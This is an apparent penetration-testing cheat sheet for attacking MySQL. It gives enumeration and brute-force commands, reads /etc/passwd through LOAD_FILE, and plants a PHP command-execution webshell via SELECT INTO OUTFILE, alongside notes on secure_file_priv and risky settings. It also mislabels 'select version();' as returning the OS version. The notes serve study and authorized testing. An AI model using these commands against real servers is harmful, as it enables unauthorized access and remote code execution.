# General Informations

```
# Default databases

- mysql : is the system database that contains tables that store information required by the MySQL server

- information_schema : provides access to database metadata

- performance_schema : is a feature for monitoring MySQL Server execution at a low level

- sys : a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
```


# Enumeration

```
nmap -sVC -p3306 $IP --script=mysql-*

# using Metasploit
use auxiliary/scanner/mysql/mysql_
```


# Interacting w/ service
```
# Connect locally
mysql -u user -p

# Connect remotely
mysql -u user -h $IP
```


# Bruteforce

```
# Using Hydra
hydra -l user -P password.list -t 64 $IP mysql
```


# Read Local Files

```
# By default MySQL does not allow arbitrary file read, but if settings have been changed :

mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
<SNIP>
```


# Write Local Files

```
mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)

# We can query the webshell using : 
http://IP/webshell.php?cmd=whoami
```

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv)
limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function.
These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:
```bash
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

# SQL Commands

|Commands|**Description**|
|---|---|
|`mysql -u <user> -p<password> -h <IP address>`|Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.|
|`select version();`|Returns the version of the operating system|
|`show databases;`|See all the databases.|
|`use mysql;`|Select and use the database “mysql”.|
|`show tables;`|Show all available tables in the selected database.|
|`select * from <table>;`|Show everything in the desired table.|
|`show columns from <table>;`|Show all columns in the selected database.|
|`select * from <table> where <column> = "<string>";`|Search for needed string in the desired table.|
|`debug`|This variable indicates the current debugging settings|
|`sql_warnings`|This variable controls whether single-row INSERT statements produce an information string if warnings occur.|

The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema` (`information_schema`).
The system schema contains tables, information, and metadata necessary for management.

# Dangerous Settings

```
# Conf file
/etc/mysql/mysql.conf.d/mysqld.cnf
```

|**Dangerous settings**|**Description**|
|---|---|
|`user`|Sets which user the MySQL service will run as. Entries are in plain-text.|
|`password`|Sets the password for the MySQL user. Entries are in plain-text.|
|`admin_address`|The IP address on which to listen for TCP/IP connections on the administrative network interface. Entries are in plain-text.|
|`debug`|This variable indicates the current debugging settings|
|`sql_warnings`|This variable controls whether single-row INSERT statements produce an information string if warnings occur.|
|`secure_file_priv`|This variable is used to limit the effect of data import and export operations.|

The `debug` and `sql_warnings` settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others.

[MySQL Best Practices for securing servers](https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html)